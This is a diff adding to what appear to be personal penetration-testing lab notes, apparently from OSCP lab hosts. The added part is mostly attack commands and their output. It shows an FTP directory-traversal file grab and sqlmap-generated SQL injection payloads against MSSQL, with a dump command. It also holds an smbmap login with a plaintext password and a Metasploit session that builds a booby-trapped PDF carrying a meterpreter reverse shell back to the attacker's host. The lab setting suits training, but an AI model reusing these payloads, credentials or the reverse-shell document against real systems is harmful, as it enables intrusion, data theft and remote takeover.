@@ -731,3 +731,55 @@ uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
 
 cat proof.txt
 f96fa30b9bc142e9d5c3649b055c28de
+
+# 10.11.1.125
+
+ftp> get  ../../../../DOCUME~1/Administrateur/Bureau/proof.txt  proof.txt
+local: proof.txt remote: ../../../../DOCUME~1/Administrateur/Bureau/proof.txt
+200 Port command successful.
+150 Opening data connection for ../../../../DOCUME~1/Administrateur/Bureau/proof.txt.
+226 File sent ok
+32 bytes received in 0.00 secs (16.4128 kB/s)
+
+root@ens:~/oscp/125# cat proof.txt ;echo
+dae9aad6636a1c2c330b435e5d1f8120
+
+# 10.11.1.128
+
+Parameter: ID (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=1000' AND 8681=8681-- OTld
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
+    Payload: ID=1000' AND 6986 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (6986=6986) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(120)+CHAR(113)))-- aJNI
+    
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: ID=1000' UNION ALL SELECT NULL,CHAR(113)+CHAR(122)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(89)+CHAR(90)+CHAR(111)+CHAR(120)+CHAR(100)+CHAR(70)+CHAR(69)+CHAR(80)+CHAR(105)+CHAR(88)+CHAR(81)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(111)+CHAR(115)+CHAR(111)+CHAR(99)+CHAR(101)+CHAR(103)+CHAR(104)+CHAR(108)+CHAR(77)+CHAR(110)+CHAR(110)+CHAR(107)+CHAR(117)+CHAR(121)+CHAR(76)+CHAR(100)+CHAR(98)+CHAR(119)+CHAR(101)+CHAR(70)+CHAR(106)+CHAR(107)+CHAR(70)+CHAR(75)+CHAR(81)+CHAR(73)+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(120)+CHAR(113),NULL,NULL-- skOu
+sqlmap -r info.req  --level 5 --risk 3 --dbms mssql --dump
+
+ smbmap  -H 10.11.1.128 -u acusecret -p '!3lit3@1ss0rd'
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.11.1.128...
+[+] IP: 10.11.1.128:445 Name: dj.acme.local
+        Disk                                                    Permissions
+----                                                    -----------
+​        IPC$                                                    NO ACCESS
+​        share                                                   READ, WRITE
+​        wwwroot                                                 READ ONLY
+​        ADMIN$                                                  NO ACCESS
+​        C$                                                      NO ACCESS
+
+
+
+msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set lhost 10.11.0.104
+lhost => 10.11.0.104
+msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe) > exploit
+
+[*] Reading in '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
+[*] Parsing '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
+[*] Using 'windows/meterpreter/reverse_tcp' as payload...
+[+] Parsing Successful. Creating 'evil.pdf' file...
+[+] evil.pdf stored at /root/.msf4/local/evil.pdf
